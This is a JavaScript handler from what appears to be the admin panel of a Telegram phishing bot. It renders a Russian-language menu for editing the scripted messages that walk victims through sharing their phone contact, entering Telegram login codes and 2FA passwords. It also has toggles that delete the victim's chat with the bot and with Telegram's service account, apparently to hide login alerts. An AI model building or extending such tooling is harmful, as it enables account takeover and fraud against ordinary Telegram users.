import { bot } from "../../index.js";
import template from "../../../database/schemas/template.js";

export default {
    name: "t",
    async exec(query, [id]) {
        const t = await template.findOne({ id });
        if(!t) return await bot.answerCallbackQuery(query.id, {
            text: "❌ Шаблон не найден"
        });

        await bot.editMessageCaption(query, `📁 Шаблон: \`${t.name}\`
Выберите какое сообщение хотите изменить`, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: `👋🏻 Вступительное сообщение /start`,
                            callback_data: `editt:${id}:start`
                        }
                    ],
                    [
                        {
                            text: `👤 Кнопка поделится контактом`,
                            callback_data: `editt:${id}:contact` 
                        }
                    ],
                    [
                        {
                            text: `⌛️ Ожидание кода`,
                            callback_data: `editt:${id}:wait`
                        },
                        {
                            text: `📲 Ввод кода`,
                            callback_data: `editt:${id}:code`
                        }
                    ],
                    // [
                    //     {
                    //         text: `📝 Вводит код не на клавиатуре`,
                    //         callback_data: `editt:${id}:NaNCode`
                    //     }
                    // ],
                    [
                        {
                            text: `♻️ Проверка кода`,
                            callback_data: `editt:${id}:auth`
                        },
                        {
                            text: `❌ Неверный код`,
                            callback_data: `editt:${id}:wrongCode`
                        }
                    ],
                    [
                        {
                            text: `⏰ Код просрочен`,
                            callback_data: `editt:${id}:timeout`
                        },
                        {
                            text: `🚫 Ошибка отправки кода`,
                            callback_data: `editt:${id}:error`
                        }
                    ],
                    [
                        {
                            text: `🔐 Ввод пароля (2FA)`,
                            callback_data: `editt:${id}:password`
                        }
                    ],
                    [
                        {
                            text: `🔒 Неверный пароль (2FA)`,
                            callback_data: `editt:${id}:wrongPassword`
                        }
                    ],
                    [
                        {
                            text: `🎉 Сообщение после авторизации ${t.mailing1hUnauth ? '🟢' : '🔴'}`,
                            callback_data: `editt:${id}:mailingUnauth`
                        }
                    ],
                    // [
                    //     {
                    //         text: `📞 Определение номера (🟢/🔴)`,
                    //         callback_data: `editt:${id}:phoneCheck`
                    //     }
                    // ],
                    [
                        // {
                        //     text: `📣 Авто.Рассылка (🟢/🔴)`,
                        //     callback_data: `editt:${id}:autoMailing`
                        // },
                        {
                            text: `👥 Реф.система`,
                            callback_data: `referral:${id}`
                        }
                    ],
                    [
                        {
                            text: `🤖 Удалить чат с ботом ${t.deleteBot ? '🟢' : '🔴'}`,
                            callback_data: `editt:${id}:deleteBot`
                        }
                    ],
                    [
                        {
                            text: `🔇 Удалить чат с telegram ${t.deleteTelegram ? '🟢' : '🔴'}`,
                            callback_data: `editt:${id}:deleteTelegram`
                        }
                    ],
                    [
                        {
                            text: '🗑 Удалить',
                            callback_data: `editt:${id}:delete`
                        },
                        {
                            text: '🔙 Назад',
                            callback_data: 'templates'
                        }
                    ]
                ]
            },
            message_id: query.message.message_id,
            chat_id: query.message.chat.id
        }, 'cdn/templates.png')
    }
}